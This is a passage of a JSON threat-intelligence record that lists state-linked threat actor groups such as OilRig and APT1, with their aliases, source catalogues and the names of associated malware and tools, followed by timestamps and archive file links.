            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "64ca1755-3883-4173-8e0a-6e5cf92faafd",
            "created_at": "2022-10-25T15:50:23.636456Z",
            "updated_at": "2025-03-27T02:00:55.51077Z",
            "deleted_at": null,
            "main_name": "Deep Panda",
            "aliases": [
                "Deep Panda",
                "Shell Crew",
                "KungFu Kittens",
                "PinkPanther",
                "Black Vine"
            ],
            "source_name": "MITRE:Deep Panda",
            "tools": [
                "Mivast",
                "StreamEx",
                "Sakula",
                "Tasklist",
                "Derusbi"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "0e03175d-b1fe-4d4e-bd3a-a8c0feb5eb43",
            "created_at": "2023-01-06T13:46:38.705578Z",
            "updated_at": "2025-03-27T02:00:02.896813Z",
            "deleted_at": null,
            "main_name": "APT6",
            "aliases": [
                "1.php Group"
            ],
            "source_name": "MISPGALAXY:APT6",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "392aed78-4ef6-46ac-afba-c3920ea05d28",
            "created_at": "2022-10-25T16:07:23.323349Z",
            "updated_at": "2025-03-27T02:02:09.737228Z",
            "deleted_at": null,
            "main_name": "APT 6",
            "aliases": [
                "1.php Group"
            ],
            "source_name": "ETDA:APT 6",
            "tools": [
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "Poison Ivy",
                "SPIVY",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1627553608,
    "ts_modification_date": 1627558855,
    "files": {
        "pdf": "https://archive.orkl.eu/173eaa8ad48973498624c0b4923cfafd3a3e5a41.pdf",
        "text": "https://archive.orkl.eu/173eaa8ad48973498624c0b4923cfafd3a3e5a41.txt",
        "img": "https://archive.orkl.eu/173eaa8ad48973498624c0b4923cfafd3a3e5a41.jpg"
    }
}